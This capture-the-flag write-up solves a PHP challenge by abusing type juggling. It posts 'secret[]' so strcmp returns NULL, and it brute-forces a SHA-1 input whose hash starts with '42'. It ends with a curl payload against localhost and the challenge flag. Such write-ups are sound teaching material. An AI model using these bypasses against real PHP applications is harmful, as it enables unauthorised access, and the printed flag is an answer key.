Inspiration https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

Solution: Exploit PHP's funny type juggling problems to get flag

Analysing the source code:

> Reads in POST data

![image](https://user-images.githubusercontent.com/63996033/233854958-b5ce7010-9135-4f5a-a9d8-a0d17d56f299.png)

> Uses strcmp to check the secret values (unsafe due to type juggling by PHP

![image](https://user-images.githubusercontent.com/63996033/233855074-a4bdcec5-9ee6-459a-b7ef-85ac17cfaa6a.png)

> Hashes the `meaningoflife` input and checks if it is 42

![image](https://user-images.githubusercontent.com/63996033/233855416-ce38e8d4-e173-43f2-a09f-af3aff1e42f6.png)

From this somethings can be observed: How is possible that a [sha1 hashed](https://en.wikipedia.org/wiki/SHA-1), which produces 20 byte long hashes, be able to equal the number 42; What's up with strcmp and how can I get the correct secret?

Well [this](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) explains it clearly.

> There are strict comparisons which uses `===` (3 equal signs)

![image](https://user-images.githubusercontent.com/63996033/233855569-7913975a-f604-4695-91ff-d2cd869f1b91.png)

> There are loose comparisons which uses `==` (2 equal signs)

![image](https://user-images.githubusercontent.com/63996033/233855593-197bc175-acf5-4485-b591-6424bb8827e8.png)

So to bypass the secret check we could pass in an array instead. It would result in NULL given out by the strcmp function.

![image](https://user-images.githubusercontent.com/63996033/233855757-b98a157f-3755-4ae1-9d90-96924bafcc4c.png)

![image](https://user-images.githubusercontent.com/63996033/233855795-30ca7780-c714-4911-91c7-21ecace9a550.png)

Since `NULL = 0` this method works when we give `secret[]` instead of `secret`

![image](https://user-images.githubusercontent.com/63996033/233857301-82d2bd84-529c-499a-9703-cacb287e65b7.png)

There we go it works. Now time to bypass the `meaningoflife` check. Similarly, we can abuse the PHP type juggling here also!

![image](https://user-images.githubusercontent.com/63996033/233857575-157e9cf6-c909-4cf9-8bb6-2c51edb98d05.png)

So, just need to input a hash with `42` as starting followed by a non-digit character. [I bruteforced it using python.](gethash.py)

```py
import hashlib
import random
import string

for i in range(10000):
    random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))
    hash = hashlib.sha1(random_string.encode('utf-8')).hexdigest()
    # print the hash
    if hash.startswith('42') and hash[2] not in '0123456789':
        print(random_string)

# outputs: can use any of these for meaningoflife
'''
sFfpR
REPAb
bwGE0
qzGp0
xT91y
BhTRg
pTSjA
GqmIe
72tm9
E1VGD
Odowg
U8jyj
M5ODb
Q0z3U
YbcM0
48I7K
zqOxi
mhW7H
fYHxh
'''
```

> So the final payload will be:

```
curl -X POST "http://localhost:2345/index.php" -d "secret[]"="anything" -d "meaningoflife"="sFfpR"
```

![image](https://user-images.githubusercontent.com/63996033/233857833-ceef910d-ed3e-4cf3-91c1-1f6046dee987.png)

Flag: `blocs{php_is_the_biggest_clown_of_all_the_clowns}`
